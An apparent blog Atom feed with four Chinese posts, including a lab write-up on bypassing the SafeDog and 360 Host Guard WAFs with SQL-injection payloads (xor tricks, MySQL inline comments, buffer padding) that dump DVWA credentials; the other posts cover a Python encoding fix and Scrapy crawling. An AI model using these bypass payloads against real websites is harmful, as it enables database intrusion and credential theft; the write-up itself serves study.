<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Teams Six</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://www.teamssix.com/"/>
  <updated>2020-02-06T12:43:20.142Z</updated>
  <id>https://www.teamssix.com/</id>
  
  <author>
    <name>Teams Six</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>【摘要】漏洞组合拳之XSS+CSRF记录</title>
    <link href="https://www.teamssix.com/year/200206-202959.html"/>
    <id>https://www.teamssix.com/year/200206-202959.html</id>
    <published>2020-02-06T12:29:59.000Z</published>
    <updated>2020-02-06T12:43:20.142Z</updated>
    
    <content type="html"><![CDATA[<p>前几天，我在FreeBuf发布了一篇文章《漏洞组合拳之XSS+CSRF记录》，因为版权原因，无法在​这里发布。</p><p>文章里介绍了两种常见的组合拳方法，感兴趣的可以点击下方链接进行查看。</p><p>文章链接：<a href="https://www.freebuf.com/vuls/225096.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/225096.html</a></p><a id="more"></a><blockquote><p>更多信息欢迎关注我的个人微信公众号：TeamsSix<br>本文原文地址：<a href="https://www.teamssix.com/year/200206-202959.html">https://www.teamssix.com/year/200206-202959.html</a></p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;前几天，我在FreeBuf发布了一篇文章《漏洞组合拳之XSS+CSRF记录》，因为版权原因，无法在​这里发布。&lt;/p&gt;
&lt;p&gt;文章里介绍了两种常见的组合拳方法，感兴趣的可以点击下方链接进行查看。&lt;/p&gt;
&lt;p&gt;文章链接：&lt;a href=&quot;https://www.freebuf.com/vuls/225096.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.freebuf.com/vuls/225096.html&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="摘要" scheme="https://www.teamssix.com/categories/%E6%91%98%E8%A6%81/"/>
    
    
      <category term="XSS" scheme="https://www.teamssix.com/tags/XSS/"/>
    
      <category term="CSRF" scheme="https://www.teamssix.com/tags/CSRF/"/>
    
      <category term="组合拳" scheme="https://www.teamssix.com/tags/%E7%BB%84%E5%90%88%E6%8B%B3/"/>
    
  </entry>
  
  <entry>
    <title>【经验总结】Python3 Requests 模块请求内容包含中文报错的解决办法</title>
    <link href="https://www.teamssix.com/year/200206-202951.html"/>
    <id>https://www.teamssix.com/year/200206-202951.html</id>
    <published>2020-02-06T12:29:51.000Z</published>
    <updated>2020-02-06T12:44:36.542Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>最近在写一个爬虫代码，里面需要使用 get 传参中文，但是如果直接使用中文而不对其编码的话，程序将会报错。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UnicodeEncodeError: &apos;latin-1&apos; codec can&apos;t encode characters in position 38-39: ordinal not in range(256)</span><br></pre></td></tr></table></figure><a id="more"></a><h1 id="0x01-网上的一些解决办法"><a href="#0x01-网上的一些解决办法" class="headerlink" title="0x01 网上的一些解决办法"></a>0x01 网上的一些解决办法</h1><p>参考网上的解决办法，比如下面的几种办法。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1、在中文后加上&quot;.encode(&apos;GBK&apos;)&quot;</span><br><span class="line">2、在文件头部加上&quot;＃coding = utf-8&quot;</span><br><span class="line">3、在中文后加上&quot;.encode(&apos;utf-8&apos;)&quot;</span><br></pre></td></tr></table></figure><p>这几种方法在我这里都行不通，抓包也可以看到数据包里的中文并不是我们想象的经过 URL 编码的字符。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /test=b&apos;%5Cxe6%5Cxb5%5Cx8b%5Cxe8%5Cxaf%5Cx95&apos; HTTP/1.1</span><br></pre></td></tr></table></figure><h1 id="0x02-可行的办法"><a href="#0x02-可行的办法" class="headerlink" title="0x02 可行的办法"></a>0x02 可行的办法</h1><p>最后才意识到，其实并不需要对中文进行 GBK、UTF-8 转码，而应该对其进行 URL 编码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">from urllib.parse import quote</span><br><span class="line">text = quote(&quot;测试&quot;, &apos;utf-8&apos;)</span><br></pre></td></tr></table></figure><p>利用 quote 函数对 “测试” 进行 URL 编码后，再次抓包可以看到中文部分已经是 URL 格式了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /test=%E6%B5%8B%E8%AF%95 HTTP/1.1</span><br></pre></td></tr></table></figure><p>此时，程序也不再报错，可以顺利执行了。</p><blockquote><p>更多信息欢迎关注我的个人微信公众号：TeamsSix<br>本文原文地址：<a href="https://www.teamssix.com/year/200206-202951.html">https://www.teamssix.com/year/200206-202951.html</a><br>参考文章：<a href="https://blog.csdn.net/qq_33876553/article/details/79730246" target="_blank" rel="noopener">https://blog.csdn.net/qq_33876553/article/details/79730246</a></p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;最近在写一个爬虫代码，里面需要使用 get 传参中文，但是如果直接使用中文而不对其编码的话，程序将会报错。&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;UnicodeEncodeError: &amp;apos;latin-1&amp;apos; codec can&amp;apos;t encode characters in position 38-39: ordinal not in range(256)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="经验总结" scheme="https://www.teamssix.com/categories/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/"/>
    
    
      <category term="经验总结" scheme="https://www.teamssix.com/tags/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/"/>
    
      <category term="Python3" scheme="https://www.teamssix.com/tags/Python3/"/>
    
      <category term="解决办法" scheme="https://www.teamssix.com/tags/%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>【经验总结】SQL注入Bypass安全狗360主机卫士</title>
    <link href="https://www.teamssix.com/year/200105-211642.html"/>
    <id>https://www.teamssix.com/year/200105-211642.html</id>
    <published>2020-01-05T13:16:42.000Z</published>
    <updated>2020-01-05T13:54:10.260Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>这类的文章已经是比较多了，本文也主要是作为学习笔记来记录，主要是记录一下我在学习 SQL 注入 Bypass 的过程，同时前人的不少绕过方法已经失效了，所以这里也是记录一下最新规则的一些绕过方法。</p><h1 id="0x01-环境搭建"><a href="#0x01-环境搭建" class="headerlink" title="0x01 环境搭建"></a>0x01 环境搭建</h1><p>测试环境：Win7 + Apache + MySQL 5.7.26 + PHP 5.5.45</p><a id="more"></a><p>测试代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> ($_GET[<span class="string">'id'</span>]==<span class="keyword">null</span>)&#123;$id=$_POST[<span class="string">'id'</span>];&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;$id=$_GET[<span class="string">'id'</span>];&#125;</span><br><span class="line">$con = mysql_connect(<span class="string">"localhost"</span>,<span class="string">"root"</span>,<span class="string">"root"</span>);</span><br><span class="line"><span class="keyword">if</span> (!$con)&#123;<span class="keyword">die</span>(<span class="string">'Could not connect: '</span> . mysql_error());&#125;</span><br><span class="line">mysql_select_db(<span class="string">"dvwa"</span>, $con);</span><br><span class="line">$query = <span class="string">"SELECT first_name,last_name FROM users WHERE user_id = '$id'; "</span>;</span><br><span class="line">$result = mysql_query($query)<span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'&lt;pre&gt;'</span>.mysql_error().<span class="string">'&lt;/pre&gt;'</span>);</span><br><span class="line"><span class="keyword">while</span>($row = mysql_fetch_array($result))</span><br><span class="line">&#123;</span><br><span class="line"> <span class="keyword">echo</span> $row[<span class="string">'0'</span>] . <span class="string">"&amp;nbsp"</span> . $row[<span class="string">'1'</span>];</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">"&lt;br /&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> $query;</span><br><span class="line">mysql_close($con);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>上面的测试代码是参考安全客上的一篇文章，不过为了方便测试在原代码的基础上加入了 POST 传参功能，代码来自本文参考文章第 2 篇。</p><p>为方便接下来的测试，需要本地先安装 dvwa ，至于代码中其他的参数，比如数据库地址、用户名、密码什么的自行根据自己本地配置情况修改即可。</p><p>如果这个代码在使用的过程中，只使用 POST 方法传参的话，页面是会输出错误信息的，如果不想让它输出错误信息，可以在 php.ini 文件中修改 display_errors 为 Off ，然后重启 Apache 即可。</p><p>访问本地搭建的靶场地址，像下面这个样子就算是搭建成功了，其中 192.168.38.132​ 需要修改为你自己的靶机 IP 地址。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.38.132/sql.php?id=1</span><br></pre></td></tr></table></figure><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/SQL_Bypass1.png" alt></p><h1 id="0x02-安全狗"><a href="#0x02-安全狗" class="headerlink" title="0x02 安全狗"></a>0x02 安全狗</h1><h2 id="1、搭建"><a href="#1、搭建" class="headerlink" title="1、搭建"></a>1、搭建</h2><p>下载地址：<a href="http://free.safedog.cn/website_safedog.html" target="_blank" rel="noopener">http://free.safedog.cn/website_safedog.html</a></p><p>我下载的是 Windows Apache V4.0 的版本，2019-11-27 更新的规则。</p><p>在安装安全狗的时候，如果不知道服务名填什么，可以查看本文参考文章第 5 篇。</p><p>如果使用 phpstudy 8.0 及更高版本可能在系统服务中找不到 apache 的服务名，所以这时建议使用 8.0 以下版本，比如 phpstudy 2018，之后再设置运行模式为“系统服务”即可，不要问我怎么知道的 [狗头]</p><p>搭建好后，我们构造 SQL 注入语句判断注入点，访问目标网站，网站有安全狗的提示，说明就搭建好了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.38.132/sql.php?id=1&apos; and &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/SQL_Bypass2.png" alt></p><h2 id="2、找寻绕过方法"><a href="#2、找寻绕过方法" class="headerlink" title="2、找寻绕过方法"></a>2、找寻绕过方法</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; and &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure><p>多次测试发现单引号不会被拦截，and 也不会被拦截，只有当 and 后加上字符，比如 and ‘1’ 的时候才会被拦截，所以接下来就主要针对 and 进行绕过测试。</p><p>一般情况下，如果 and 被拦截，可以下列字符进行绕过。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">+，-，*，%，/，&lt;&lt;，&gt;&gt;，||，|，&amp;，&amp;&amp;</span><br></pre></td></tr></table></figure><p>或者使用 or 进行绕过，也可以直接使用异或进行绕过。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">^，xor</span><br></pre></td></tr></table></figure><p>因为我下载的版本的规则是最新的，所以参考文章中利用 &amp;&amp; 替换 and 的方法已经失效了，经过多次测试，这里使用异或是可以绕过安全狗进而判断注入点的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; xor &apos;1</span><br></pre></td></tr></table></figure><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/SQL_Bypass3.png" alt></p><p>接下来使用 union select 查看一下数据库名和用户名。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;union select database(),user()&apos;</span><br></pre></td></tr></table></figure><p>直接这样肯定会被拦截的，所以接下来找寻绕过方法。</p><h3 id="a、利用-代替空格"><a href="#a、利用-代替空格" class="headerlink" title="a、利用()代替空格"></a>a、利用()代替空格</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;union select(database()),(user())&apos;</span><br></pre></td></tr></table></figure><p>数据或者函数周围可以无限嵌套()。</p><h3 id="b、利用-mysql-特性-执行语句"><a href="#b、利用-mysql-特性-执行语句" class="headerlink" title="b、利用 mysql 特性 /!/ 执行语句"></a>b、利用 mysql 特性 /<em>!</em>/ 执行语句</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;union /*!50010select*/(database()),(user())&apos;</span><br></pre></td></tr></table></figure><p>/<em>!</em>/ 中间的代码是可以执行的，其中 50010 为 mysql 版本号，只要 mysql 大于这个版本就会执行里面的代码。</p><h3 id="c、利用-混淆代码"><a href="#c、利用-混淆代码" class="headerlink" title="c、利用/**/混淆代码"></a>c、利用/**/混淆代码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;union/**//*!50010select*/(database/**/()),(user/**/())&apos;</span><br></pre></td></tr></table></figure><p>mysql 关键字中是不能插入 /**/ 的，即 se/**/lect 是会报错的，但是函数名和括号之间是可以加上 /**/ 的,像 database/**/() 这样的代码是可以执行的。</p><p>事实上，由于我的防护规则是 2019-11-27 更新的，所以即使如此，依旧不能绕过，不过由于安全狗对于 GET 的过滤相较于 POST 更为严格，所以后来经过测试发现使用 POST 方法是可以进行绕过的。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/SQL_Bypass4.png" alt></p><p>可以看到使用 POST 方法是可以成功绕过，除了上面的3个方法，有时候使用 %00 也会有意想不到的效果。</p><p>知道了绕过方法，便可以一路找到用户名和密码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;union select user,password from users#</span><br></pre></td></tr></table></figure><p>经过测试，发现在 POST 方法下，加个括号即可绕过安全狗，这也足以看出安全狗对于 POST 方法的过滤是多么不严格。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;union select user,password from (users)#</span><br></pre></td></tr></table></figure><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/SQL_Bypass5.png" alt></p><p>绕过的方法还有很多，安全狗的就记录到这里，接下来看看 360 主机卫士。</p><h1 id="0x03-360-主机卫士"><a href="#0x03-360-主机卫士" class="headerlink" title="0x03 360 主机卫士"></a>0x03 360 主机卫士</h1><h2 id="1、搭建-1"><a href="#1、搭建-1" class="headerlink" title="1、搭建"></a>1、搭建</h2><p>曾经 360 出现过一款 360 主机卫士，不过现在已经停止更新和维护了，官网也打不开了，所以只能在第三方网站下载了，这里我下载的是 2.0.5.9 版本。</p><p>下载地址：<a href="http://www.pc6.com/softview/SoftView_145230.html" target="_blank" rel="noopener">http://www.pc6.com/softview/SoftView_145230.html</a></p><p>虽然 360 主机卫士已经停止了更新，但是拿来练练手还是可以滴。</p><p>下载之后，访问 ‘ and ‘1’=’1 如果发现被拦截了，返回内容像下面这个样子，说明就搭建成功了。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/SQL_Bypass6.png" alt></p><h2 id="2、找寻绕过方法-1"><a href="#2、找寻绕过方法-1" class="headerlink" title="2、找寻绕过方法"></a>2、找寻绕过方法</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; and &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure><p>经过多次测试，这里使用 &amp;&amp; 即可绕过，使用异或也是可以绕过的。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/SQL_Bypass7.png" alt></p><p>接下来看看 union select 怎么进行绕过。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;union select database(),user()&apos;</span><br></pre></td></tr></table></figure><p>经过多次测试，发现可以通过缓冲区溢出进行绕过，但也只有在 POST 方法下才有效。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; and (select 1)=(select 0xAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA)union select database(),user()&apos;</span><br></pre></td></tr></table></figure><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/SQL_Bypass8.png" alt></p><h1 id="0x04-工具"><a href="#0x04-工具" class="headerlink" title="0x04 工具"></a>0x04 工具</h1><p>提到 SQL 注入的工具，个人觉着就不得不提 shack2 的超级 SQL 注入工具，针对于上面缓冲区绕过的情况，使用这个工具可以很方便的进行 SQL 注入。</p><p>工具下载地址：<a href="https://github.com/shack2/SuperSQLInjectionV1/releases" target="_blank" rel="noopener">https://github.com/shack2/SuperSQLInjectionV1/releases</a></p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/SQL_Bypass9.png" alt></p><p>把 Burp 中的数据包复制到工具中，在注入标记、编码标记后，就可以获取数据了，对于如何标记注入点不理解的可以看看这个工具的教学视频以及文档，会容易理解些。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/SQL_Bypass10.png" alt></p><p>至于其他更为复杂的绕过，比如上面安全狗的绕过，利用这个工具的注入绕过模块也是可以的，当然使用 sqlmap 的 tamper 脚本也是 OK 的，暂时本文就先记录到这里。</p><blockquote><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><blockquote><p>参考文章：<br><a href="https://zhuanlan.zhihu.com/p/41332480" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/41332480</a><br><a href="https://www.anquanke.com/post/id/102852" target="_blank" rel="noopener">https://www.anquanke.com/post/id/102852</a><br><a href="https://www.secpulse.com/archives/68991.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/68991.html</a><br><a href="https://www.cnblogs.com/xiaozi/p/9132737.html" target="_blank" rel="noopener">https://www.cnblogs.com/xiaozi/p/9132737.html</a><br><a href="https://blog.csdn.net/weixin_30886233/article/details/95871508" target="_blank" rel="noopener">https://blog.csdn.net/weixin_30886233/article/details/95871508</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;这类的文章已经是比较多了，本文也主要是作为学习笔记来记录，主要是记录一下我在学习 SQL 注入 Bypass 的过程，同时前人的不少绕过方法已经失效了，所以这里也是记录一下最新规则的一些绕过方法。&lt;/p&gt;
&lt;h1 id=&quot;0x01-环境搭建&quot;&gt;&lt;a href=&quot;#0x01-环境搭建&quot; class=&quot;headerlink&quot; title=&quot;0x01 环境搭建&quot;&gt;&lt;/a&gt;0x01 环境搭建&lt;/h1&gt;&lt;p&gt;测试环境：Win7 + Apache + MySQL 5.7.26 + PHP 5.5.45&lt;/p&gt;
    
    </summary>
    
      <category term="经验总结" scheme="https://www.teamssix.com/categories/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/"/>
    
    
      <category term="经验总结" scheme="https://www.teamssix.com/tags/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/"/>
    
      <category term="SQL 注入" scheme="https://www.teamssix.com/tags/SQL-%E6%B3%A8%E5%85%A5/"/>
    
      <category term="Bypass" scheme="https://www.teamssix.com/tags/Bypass/"/>
    
  </entry>
  
  <entry>
    <title>【Python Scrapy 爬虫框架】 6、继续爬虫、终止和重启任务</title>
    <link href="https://www.teamssix.com/year/191226-151707.html"/>
    <id>https://www.teamssix.com/year/191226-151707.html</id>
    <published>2019-12-26T07:17:07.000Z</published>
    <updated>2019-12-26T08:24:36.129Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>有时候我们不想只爬一个页面的，比如之前我只爬了主页，但是现在想把其他页面的也爬下来，这就是本文的任务。</p><h1 id="0x01-修改代码"><a href="#0x01-修改代码" class="headerlink" title="0x01 修改代码"></a>0x01 修改代码</h1><p>在之前的基础上，修改 teamssix_blog_spider.py 文件，首先添加 start_urls</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">start_urls = [</span><br><span class="line">   <span class="string">'https://www.teamssix.com'</span>,</span><br><span class="line">   <span class="string">'https://www.teamssix.com/page/2/'</span>,</span><br><span class="line">   <span class="string">'https://www.teamssix.com/page/3/'</span>,</span><br><span class="line">   <span class="string">'https://www.teamssix.com/page/4/'</span>,</span><br><span class="line">   <span class="string">'https://www.teamssix.com/page/5/'</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure><a id="more"></a><p>接下来在 sub_article 函数尾部添加 parse 函数的全部代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">soup = BeautifulSoup(response.text, <span class="string">'html.parser'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> soup.select(<span class="string">'.post-title'</span>):</span><br><span class="line">   url = <span class="string">'https://www.teamssix.com&#123;&#125;'</span>.format(i[<span class="string">'href'</span>])</span><br><span class="line">   <span class="keyword">yield</span> scrapy.Request(url, callback=self.sub_article)</span><br></pre></td></tr></table></figure><p>所以 sub_article 函数的完整代码就是这个样子：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sub_article</span><span class="params">(self,response)</span>:</span></span><br><span class="line">   soup = BeautifulSoup(response.text,<span class="string">'html.parser'</span>)</span><br><span class="line">   title = self.article_title(soup)</span><br><span class="line">   list = self.article_list(soup)</span><br><span class="line">   print(title)</span><br><span class="line">   item = TeamssixItem(_id = response.url,title = title,list = list)</span><br><span class="line">   <span class="keyword">yield</span> item</span><br><span class="line"></span><br><span class="line">   soup = BeautifulSoup(response.text, <span class="string">'html.parser'</span>)</span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> soup.select(<span class="string">'.post-title'</span>):</span><br><span class="line">      url = <span class="string">'https://www.teamssix.com&#123;&#125;'</span>.format(i[<span class="string">'href'</span>])</span><br><span class="line">      <span class="keyword">yield</span> scrapy.Request(url, callback=self.sub_article)</span><br></pre></td></tr></table></figure><p>从最后一行 callback=self.sub_article 这里不难看出这里其实就是一个循环， sub_article 函数第一遍执行完，又会调用继续执行第二遍，直到 start_urls 被执行完。</p><h1 id="0x02-运行"><a href="#0x02-运行" class="headerlink" title="0x02 运行"></a>0x02 运行</h1><p>代码修改的就这些，接下来直接 scrapy crawl blogurl 运行代码，来到 robo 3T 看看爬取到的数据。</p><p><img src="https://uploader.shimo.im/f/4C5P0BNBAy8DfwVP.png!thumbnail" alt="图片"></p><p>最终在这些 start_urls 中爬取下来了 43 篇文章，Emm，还行。</p><p>这次的 Scrapy 学习笔记就更新到这里，这个项目的代码已经放在了我的 GitHub 里，项目链接已经放在了下面。</p><blockquote><p>更多信息欢迎关注我的个人微信公众号：TeamsSix<br>项目地址：<a href="https://github.com/teamssix/scrapy_study_notes" target="_blank" rel="noopener">https://github.com/teamssix/scrapy_study_notes</a></p></blockquote><blockquote><p>参考链接：<br><a href="https://youtu.be/aDwAmj3VWH4" target="_blank" rel="noopener">https://youtu.be/aDwAmj3VWH4</a><br><a href="http://doc.scrapy.org/en/latest/topics/architecture.html" target="_blank" rel="noopener">http://doc.scrapy.org/en/latest/topics/architecture.html</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;有时候我们不想只爬一个页面的，比如之前我只爬了主页，但是现在想把其他页面的也爬下来，这就是本文的任务。&lt;/p&gt;
&lt;h1 id=&quot;0x01-修改代码&quot;&gt;&lt;a href=&quot;#0x01-修改代码&quot; class=&quot;headerlink&quot; title=&quot;0x01 修改代码&quot;&gt;&lt;/a&gt;0x01 修改代码&lt;/h1&gt;&lt;p&gt;在之前的基础上，修改 teamssix_blog_spider.py 文件，首先添加 start_urls&lt;/p&gt;
&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;start_urls = [&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   &lt;span class=&quot;string&quot;&gt;&#39;https://www.teamssix.com&#39;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   &lt;span class=&quot;string&quot;&gt;&#39;https://www.teamssix.com/page/2/&#39;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   &lt;span class=&quot;string&quot;&gt;&#39;https://www.teamssix.com/page/3/&#39;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   &lt;span class=&quot;string&quot;&gt;&#39;https://www.teamssix.com/page/4/&#39;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   &lt;span class=&quot;string&quot;&gt;&#39;https://www.teamssix.com/page/5/&#39;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
